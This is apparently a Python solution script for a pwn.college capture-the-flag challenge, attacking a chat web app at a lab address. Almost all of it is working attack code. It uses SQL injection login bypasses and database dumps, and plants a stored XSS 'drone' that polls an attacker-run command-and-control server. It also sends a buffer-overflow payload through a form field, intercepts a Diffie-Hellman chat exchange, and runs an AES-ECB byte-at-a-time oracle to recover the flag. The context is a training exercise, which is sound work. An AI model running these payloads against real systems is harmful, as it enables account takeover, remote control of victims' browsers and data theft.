import os
import requests
import re
import sys
import time
import string
import json
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import quote, parse_qs
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from pwn import *

# --- Configuration ---
HOST = "10.0.0.1"
PORT = 80
BASE_URL = f"http://{HOST}:{PORT}"
BLOCK_SIZE = 16

# YOUR IP (The Hacker Container)
CALLBACK_IP = "10.0.0.5"
CALLBACK_PORT = 9000

# Binary Exploit Details
GRANT_ACCESS_ADDR = 0x401256
OVERFLOW_PADDING = 88

# Crypto Constants
DH_p = int.from_bytes(
    bytes.fromhex(
        "FFFFFFFF FFFFFFFF C90FDAA2 2168C234 C4C6628B 80DC1CD1 29024E08 8A67CC74 020BBEA6 3B139B22 514A0879 8E3404DD EF9519B3 CD3A431B 302B0A6D F25F1437 4FE1356D 6D51C245 E485B576 625E7EC6 F44C42E9 A637ED6B 0BFF5CB6 F406B7ED EE386BFB 5A899FA5 AE9F2411 7C4B1FE6 49286651 ECE45B3D C2007CB8 A163BF05 98DA4836 1C55D39A 69163FA8 FD24CF5F 83655D23 DCA3AD96 1C62F356 208552BB 9ED52907 7096966D 670C354E 4ABC9804 F1746C08 CA18217C 32905E46 2E36CE3B E39E772C 180E8603 9B2783A2 EC07A28F B5C55DF0 6F4C52C9 DE2BCBF6 95581718 3995497C EA956AE5 15D22618 98FA0510 15728E5A 8AACAA68 FFFFFFFF FFFFFFFF"
    ),
    "big",
)
DH_g = 2

# --- C2 Server Global State ---
# This allows the main thread to communicate with the HTTP server thread
command_queue = []
command_event = threading.Event()
response_event = threading.Event()


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Silence logs

    def do_GET(self):
        global command_queue

        # 1. The Drone (Alice) polling for commands
        if self.path == "/poll":
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

            if command_queue:
                cmd = command_queue.pop(0)
                self.wfile.write(json.dumps(cmd).encode())
            else:
                self.wfile.write(json.dumps({"action": "wait"}).encode())

        # 2. The Drone reporting execution finished
        elif self.path == "/done":
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            response_event.set()

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()


def start_c2_server():
    server = HTTPServer(("0.0.0.0", CALLBACK_PORT), C2Handler)
    print(f"[C2] Server listening on {CALLBACK_PORT}...")
    server.serve_forever()


def send_command_to_alice(action, **kwargs):
    """
    Queue a command for Alice's browser to execute.
    Blocks until Alice confirms execution.
    """
    global command_queue
    response_event.clear()

    cmd = {"action": action}
    cmd.update(kwargs)
    command_queue.append(cmd)

    # Wait for Alice to pick it up and finish
    # Timeout is generous because the bot rotates periodically
    if not response_event.wait(timeout=30):
        print("[-] Alice timed out responding to C2 command.")
        # If timeout, we might need to re-infect or retry, but for this CTF usually just retry
        return False
    return True


# --- Exploitation Logic ---


def inject_drone_into_alice():
    """
    Hijacks Mallory and plants the persistent JS payload in the chat with Alice.
    """
    print("[*] Infecting Alice with C2 Drone Payload...")

    # 1. Hijack Mallory
    s_mallory = requests.Session()
    bypass_payload = f"' UNION SELECT 'mallory', 'junk', 0 --"
    s_mallory.post(
        f"{BASE_URL}/login", data={"username": bypass_payload, "password": "x"}
    )

    # 2. Construct the JavaScript Payload (MINIFIED & NO COMMENTS)
    # Note: Explicit semicolons are critical because newlines are removed.
    js_payload = f"""<script>
    async function poll() {{
        try {{
            let r = await fetch('http://{CALLBACK_IP}:{CALLBACK_PORT}/poll');
            let cmd = await r.json();
            if (cmd.action === 'modify') {{
                let padding = 'A'.repeat({OVERFLOW_PADDING});
                let addr = String.fromCharCode(0x56, 0x12, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00);
                let pin_payload = padding + addr;
                let fd = new FormData();
                fd.append('username', cmd.new_username);
                fd.append('password', cmd.password);
                fd.append('admin_pin', pin_payload);
                await fetch('/user/' + cmd.target_user + '/modify', {{
                    method: 'POST',
                    body: fd
                }});
                await fetch('http://{CALLBACK_IP}:{CALLBACK_PORT}/done');
            }}
        }} catch (e) {{ console.log(e); }}
    }}
    setInterval(poll, 1000);
    </script>"""

    # 3. Send payload to Alice
    s_mallory.post(f"{BASE_URL}/chat/alice", data={"message": js_payload})
    print("[+] Payload delivered. Alice should be online soon.")
    time.sleep(5)


def retrieve_sharon_username():
    print("[*] Step 0: Retrieving Sharon's Username via Alice...")

    s_alice = requests.Session()
    login_payload = "hack' UNION SELECT 'alice', 'dummy', 0 -- "
    s_alice.post(
        f"{TARGET_URL}/login", data={"username": login_payload, "password": "x"}
    )

    injection = "alice' UNION SELECT 'alice', 'dummy', 0 ORDER BY 3 ASC -- "
    modify_url = f"{TARGET_URL}/user/{quote(injection)}/modify"
    s_alice.post(modify_url, data={"password": "hacked"})

    s_mal = requests.Session()
    s_mal.post(
        f"{TARGET_URL}/login",
        data={"username": "hack' UNION SELECT 'mallory', 'x', 0 -- ", "password": "x"},
    )
    s_mal.post(
        f"{TARGET_URL}/chat/alice",
        data={"message": "I heard someone shared the flag with Bob!"},
    )

    dh_a = int.from_bytes(os.urandom(256), "big")
    dh_A = pow(DH_g, dh_a, DH_p)
    msg = f"Hey Bob, I need to chat with you about something important. Let's chat securely over DHE-AES: {dh_A}."
    s_alice.post(f"{TARGET_URL}/chat/bob", data={"message": msg})

    dh_B = None
    dh_B_re = re.compile(r"^bob: Hey Alice, sure: (\d+)\.$", re.MULTILINE)
    for _ in range(30):
        try:
            resp = s_alice.get(f"{TARGET_URL}/chat/bob").text
            match = dh_B_re.search(resp)
            if match:
                dh_B = int(match.group(1))
                break
        except:
            pass
        time.sleep(1)

    if not dh_B:
        print("[-] Bob didn't reply.")
        return

    dh_s = pow(dh_B, dh_a, DH_p)
    key = dh_s.to_bytes(256, "big")[:16]
    cipher_send = AES.new(key, AES.MODE_ECB)
    cipher_recv = AES.new(key, AES.MODE_ECB)
    encrypt_local = lambda data: cipher_send.encrypt(
        pad(data.encode(), cipher_send.block_size)
    ).hex()
    decrypt_local = lambda data: unpad(
        cipher_recv.decrypt(bytes.fromhex(data)), cipher_recv.block_size
    ).decode()

    s_alice.post(
        f"{TARGET_URL}/chat/bob",
        data={
            "message": encrypt_local(
                "Hey Bob, I know that someone shared the flag with you. Who was it?"
            )
        },
    )

    sharon_user = None
    enc_re = re.compile(r"^bob: ([0-9a-f]+)$", re.MULTILINE)
    sharer_re = re.compile(r"Oh, it was '(\w+)'\.")

    for _ in range(10):
        resp = s_alice.get(f"{TARGET_URL}/chat/bob").text
        for em in enc_re.findall(resp):
            try:
                dec = decrypt_local(em)
                match = sharer_re.search(dec)
                if match:
                    sharon_user = match.group(1)
                    break
            except:
                pass
        if sharon_user:
            break
        time.sleep(1)

    if not sharon_user:
        print("[-] Could not retrieve Sharon's username.")
        return
    print(f"[+] Found Sharon's Username: {sharon_user}")

    return sharon_user


def dump_ciphertexts():
    # Uses unprivileged SQL injection to dump DB.
    # We do this from Python because we don't need Admin for this.
    sql_payload = "' UNION SELECT (SELECT group_concat(IFNULL(encrypted_username_1, 'DELETED') || ':' || IFNULL(encrypted_username_2, 'DELETED') || ':' || IFNULL(encrypted_contents, 'EMPTY'), '||||') FROM encrypted_chats), 'dummy_pass', 0 --"
    resp = requests.post(
        f"{BASE_URL}/login", data={"username": sql_payload, "password": "x"}
    )

    match = re.search(r"Hello (.*?)! You are", resp.text, re.DOTALL)
    if not match:
        return []

    return [
        tuple(row.split(":"))
        for row in match.group(1).strip().split("||||")
        if ":" in row
    ]


def get_block(hex_ct, n):
    ct = bytes.fromhex(hex_ct)
    start = (n - 1) * BLOCK_SIZE
    return ct[start : start + BLOCK_SIZE].hex()


def print_ciphertext(chats):
    print()
    print("[+] Chats (blocks) - 16bytes chunk")
    for chat in chats:
        print()
        print("[+] Chat :: ", chat)
        n = 32
        blocks = [chat[2][i : i + n] for i in range(0, len(chat[2]), n)]
        for ix, block in enumerate(blocks):
            print("[.] Block ", ix, "::", block)
        print()
    print()


def attack():
    # ... [Same Setup Code] ...
    threading.Thread(target=start_c2_server, daemon=True).start()

    global TARGET_URL
    TARGET_URL = BASE_URL
    sharon_user = retrieve_sharon_username()
    if not sharon_user:
        return
    print(f"[+] Target User: {sharon_user}")

    inject_drone_into_alice()

    bob_pass = "password123"
    attacker_user = "attacker"
    requests.post(
        f"{BASE_URL}/register", data={"username": attacker_user, "password": "x"}
    )

    print("[+] Configuring Alice/Bob/Sharon...")
    send_command_to_alice(
        "modify", target_user="bob", new_username="bob", password=bob_pass
    )
    send_command_to_alice(
        "modify", target_user="bob", new_username=sharon_user, password=bob_pass
    )
    send_command_to_alice(
        "modify", target_user=sharon_user, new_username="bob", password=bob_pass
    )

    recovered = b"pwn.college{"
    current_bob_name = "bob"

    # CONSTANTS
    TARGET_BLOCK_NUM = 10
    HEADER_LEN = 17
    TARGET_INDEX = (TARGET_BLOCK_NUM * 16) - 1
    START_PADDING = TARGET_INDEX - HEADER_LEN

    print("[+] Starting Oracle Attack Loop...")

    while b"}" not in recovered:
        current_pad_len = START_PADDING - len(recovered)
        if current_pad_len < 0:
            break

        target_username_len = 3 + current_pad_len  # "bob" + As
        padded_username = "bob" + ("A" * current_pad_len)

        # 1. Pad the Victim
        if current_bob_name != padded_username:
            print(f"[C2] Renaming Victim {current_bob_name} -> {padded_username}")
            success = send_command_to_alice(
                "modify",
                target_user=current_bob_name,
                new_username=padded_username,
                password=bob_pass,
            )
            if not success:
                inject_drone_into_alice()
                continue
            current_bob_name = padded_username

        # 2. Pad the Attacker (Switch Account)
        padded_attacker_name = "x" * target_username_len

        # We assume we always need a fresh slate for the loop
        # So we ensure we are logged in as the correctly sized attacker
        s_atk = requests.Session()
        # Clean slate: Delete any existing attacker
        s_atk.post(
            f"{BASE_URL}/login", data={"username": attacker_user, "password": "x"}
        )
        s_atk.post(f"{BASE_URL}/user/{attacker_user}/modify", data={"delete": "Delete"})
        # Register fresh
        requests.post(
            f"{BASE_URL}/register",
            data={"username": padded_attacker_name, "password": "x"},
        )
        attacker_user = padded_attacker_name

        # 3. Get Truth Block
        chats = dump_ciphertexts()

        print()
        print("---- Guess Ciphertext ----")
        final_chats = []
        final_chats.append(chats[0])
        final_chats.append(chats[-1])
        print_ciphertext(final_chats)
        print()

        # WE ALWAYS EXTRACT THE SAME BLOCK NUMBER
        truth_block = get_block(final_chats[0][-1], TARGET_BLOCK_NUM)

        print("[+] Truth Block ::", truth_block)

        # 4. Brute Force
        s_bob = requests.Session()
        s_bob.post(
            f"{BASE_URL}/login",
            data={"username": current_bob_name, "password": bob_pass},
        )

        found = False
        print(f"[+] Bruting char for {recovered.decode()}...")

        for char in string.printable:
            # Layout: "padded_attacker_name: The flag is pwn.college{...X"
            guess_payload = b"The flag is " + recovered + char.encode()

            s_bob.post(
                f"{BASE_URL}/chat/{attacker_user}", data={"message": guess_payload}
            )

            new_chats = dump_ciphertexts()

            print()
            print("---- Guess Ciphertext ----")
            final_chats = []
            final_chats.append(new_chats[0])
            final_chats.append(new_chats[-1])
            print_ciphertext(final_chats)
            print()

            # WE ALWAYS CHECK THE SAME BLOCK NUMBER
            guess_block = get_block(final_chats[1][-1], TARGET_BLOCK_NUM)

            print("[+] Truth Block ::", truth_block)
            print("[+] Guess Block ::", guess_block)

            # === CRITICAL FIX: CLEANUP EVERY TIME ===
            # We must delete the user so the next guess starts fresh at Block 10
            s_atk = requests.Session()
            s_atk.post(
                f"{BASE_URL}/login", data={"username": attacker_user, "password": "x"}
            )
            s_atk.post(
                f"{BASE_URL}/user/{attacker_user}/modify", data={"delete": "Delete"}
            )
            requests.post(
                f"{BASE_URL}/register",
                data={"username": attacker_user, "password": "x"},
            )
            # ========================================

            if guess_block == truth_block:
                recovered += char.encode()
                print(f"\n[+] Hit! Flag: {recovered.decode()}")
                found = True
                break
            else:
                print(char, end="", flush=True)

        if not found:
            print("\n[-] Char not found.")
            break


if __name__ == "__main__":
    attack()
